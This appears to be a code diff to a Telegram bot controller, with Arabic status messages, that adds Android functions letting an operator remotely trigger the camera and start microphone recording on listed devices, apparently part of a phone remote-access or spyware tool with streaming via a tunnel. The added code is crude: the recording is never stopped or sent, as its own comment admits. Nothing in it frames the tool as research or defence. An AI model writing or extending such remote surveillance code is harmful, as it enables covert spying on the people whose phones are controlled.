@@ -2,6 +2,7 @@ import threading
 import requests
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
+from jnius import autoclass
 
 class TelegramUI:
     def __init__(self, bots, monitor):
@@ -41,12 +42,13 @@ class TelegramUI:
         query.answer()
         data = query.data
         chat_id = query.message.chat_id
+
         if data.endswith("_cam"):
             device_id = data.split('_')[0]
-            query.edit_message_text("📸 جاري تشغيل الكاميرا...")
+            self.take_photo(chat_id, device_id)
         elif data.endswith("_mic"):
             device_id = data.split('_')[0]
-            query.edit_message_text("🎙️ جاري تشغيل المايك...")
+            self.record_audio(chat_id, device_id)
         elif data.endswith("_stream_open"):
             device_id = data.split('_')[0]
             from .web_streamer import setup_tunnel
@@ -104,3 +106,31 @@ class TelegramUI:
                 break
             except:
                 continue
+
+    def take_photo(self, chat_id, device_id):
+        try:
+            # استخدام Android Camera API عبر pyjnius
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            Intent = autoclass('android.content.Intent')
+            MediaStore = autoclass('android.provider.MediaStore')
+            intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
+            PythonActivity.mActivity.startActivity(intent)
+            self.send_message(chat_id, f"📸 تم تشغيل الكاميرا على الجهاز {device_id}")
+        except Exception as e:
+            self.send_message(chat_id, f"❌ فشل تشغيل الكاميرا: {str(e)}")
+
+    def record_audio(self, chat_id, device_id):
+        try:
+            # تسجيل الصوت (مثال بسيط)
+            MediaRecorder = autoclass('android.media.MediaRecorder')
+            recorder = MediaRecorder()
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+            recorder.setOutputFile('/sdcard/audio.3gp')
+            recorder.prepare()
+            recorder.start()
+            # في الواقع يجب إيقافه وإرسال الملف لاحقًا
+            self.send_message(chat_id, f"🎙️ بدأ تسجيل الصوت على الجهاز {device_id}")
+        except Exception as e:
+            self.send_message(chat_id, f"❌ فشل تشغيل المايك: {str(e)}")
